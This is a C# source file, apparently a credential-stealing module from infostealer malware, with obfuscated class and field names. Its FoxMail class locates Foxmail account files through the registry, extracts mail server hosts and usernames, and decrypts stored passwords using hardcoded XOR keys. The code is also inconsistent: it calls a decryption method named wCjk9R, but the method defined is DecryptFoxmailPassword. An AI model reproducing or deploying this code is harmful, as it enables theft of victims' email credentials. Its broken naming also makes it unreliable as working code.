using System;
using System.Collections.Generic;
using System.IO;
using C6Zy;
using Microsoft.Win32;

namespace rk937aHHc
{
	public class FoxMail : EtbH
	{
		public FoxMail()
		{
			this.ZYliJ = "FoxMail";
		}

		public string ZYliJ { get; set; }

        public List<WTitxI2m> Grab()
        {
            List<WTitxI2m> results = new List<WTitxI2m>();

            try
            {
                string previewExe =
                    (string)Registry.GetValue(
                        @"HKEY_CURRENT_USER\Software\Aerofox\FoxmailPreview",
                        "Executable",
                        null
                    );

                string foxmailPath =
                    (string)Registry.GetValue(
                        @"HKEY_CURRENT_USER\Software\Aerofox\Foxmail\V3.1",
                        "FoxmailPath",
                        null
                    );

                string previewDir = Path.GetDirectoryName(previewExe);
                string foxmailDir = Path.GetDirectoryName(foxmailPath);

                List<string> storageDirs = new List<string>();
                List<string> mailDirs = new List<string>();

                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

                if (Directory.Exists(previewDir + @"\Storage\"))
                    storageDirs.AddRange(Directory.GetDirectories(previewDir + @"\Storage\"));

                if (Directory.Exists(foxmailDir + @"\mail"))
                    mailDirs.AddRange(Directory.GetDirectories(foxmailDir + @"\mail"));

                if (Directory.Exists(localAppData + @"\VirtualStore\Program Files\Foxmail\mail"))
                    mailDirs.AddRange(Directory.GetDirectories(
                        localAppData + @"\VirtualStore\Program Files\Foxmail\mail"));

                if (Directory.Exists(localAppData + @"\VirtualStore\Program Files (x86)\Foxmail\mail"))
                    mailDirs.AddRange(Directory.GetDirectories(
                        localAppData + @"\VirtualStore\Program Files (x86)\Foxmail\mail"));

                if (storageDirs.Count + mailDirs.Count == 0)
                    return results;

                List<string> accountFiles = new List<string>();

                foreach (string dir in storageDirs)
                {
                    string acc = dir + @"\Accounts\Account.rec0";
                    if (File.Exists(acc))
                        accountFiles.Add(acc);
                }

                foreach (string dir in mailDirs)
                {
                    string acc = dir + @"\Account.stg";
                    if (File.Exists(acc))
                        accountFiles.Add(acc);
                }

                foreach (string file in accountFiles)
                {
                    byte[] data = File.ReadAllBytes(file);

                    int version = (data[0] == 0xD0) ? 0 : 1;

                    WTitxI2m current = new WTitxI2m();
                    bool hasUser = false;
                    bool hasHost = false;
                    string token = "";

                    for (int i = 0; i < data.Length; i++)
                    {
                        byte b = data[i];

                        if (b > 32 && b < 127 && b != '=')
                        {
                            token += (char)b;

                            if (token == "POP3Host" || token == "SMTPHost" || token == "IncomingServer")
                            {
                                int p = (version == 0) ? i + 2 : i + 9;
                                while (data[p] > 32 && data[p] < 127)
                                    current.data1 += (char)data[p++];

                                hasHost = true;
                                i = p;
                            }
                            else if (token == "Account" || token == "MailAddress")
                            {
                                int p = (version == 0) ? i + 2 : i + 9;
                                while (data[p] > 32 && data[p] < 127)
                                    current.data2 += (char)data[p++];

                                hasUser = true;
                                i = p;
                            }
                            else if (hasUser && hasHost &&
                                     (token == "Password" || token == "POP3Password"))
                            {
                                int p = (version == 0) ? i + 2 : i + 9;
                                string enc = "";

                                while (data[p] > 32 && data[p] < 127)
                                    enc += (char)data[p++];

                                current.data3 =
                                    enc.Length > 0 ? FoxMail.wCjk9R(version, enc) : "";

                                bool exists = false;
                                foreach (var r in results)
                                {
                                    if (r.data2 == current.data2 &&
                                        r.data3 == current.data3)
                                    {
                                        exists = true;
                                        break;
                                    }
                                }

                                if (!exists)
                                {
                                    current.data4 = this.ZYliJ;
                                    results.Add(current);
                                }

                                current = new WTitxI2m();
                                hasUser = hasHost = false;
                                i = p;
                            }
                        }
                        else
                        {
                            token = "";
                        }
                    }
                }
            }
            catch
            {
            }

            return results;
        }

        private static string DecryptFoxmailPassword(int version, string hexCipher)
        {
            string result = "";

            try
            {
                int[] keyV0 =
                {
                    126, 100, 114, 97, 71, 111, 110, 126
                };

                int[] keyV1 =
                {
                    126, 70, 64, 55, 37, 109, 36, 126
                };

                int xorKey = 0x5A;
                int[] key = keyV0;

                if (version == 1)
                {
                    key = keyV1;
                    xorKey = 0x71;
                }

                int length = hexCipher.Length / 2;
                int[] cipher = new int[length];

                for (int i = 0; i < length; i++)
                {
                    cipher[i] = Convert.ToInt32(hexCipher.Substring(i * 2, 2), 16);
                }

                int[] stage1 = new int[length];
                stage1[0] = cipher[0] ^ xorKey;
                Array.Copy(cipher, 1, stage1, 1, length - 1);

                while (key.Length < cipher.Length)
                {
                    int[] expanded = new int[key.Length * 2];
                    Array.Copy(key, expanded, key.Length);
                    Array.Copy(key, 0, expanded, key.Length, key.Length);
                    key = expanded;
                }

                int[] stage2 = new int[length - 1];
                for (int i = 1; i < length; i++)
                {
                    stage2[i - 1] = cipher[i] ^ key[i - 1];
                }

                for (int i = 0; i < stage2.Length - 1; i++)
                {
                    int value = stage2[i] - stage1[i];
                    if (value < 0)
                        value += 255;

                    result += (char)value;
                }
            }
            catch
            {
            }

            return result;
        }
    }
}
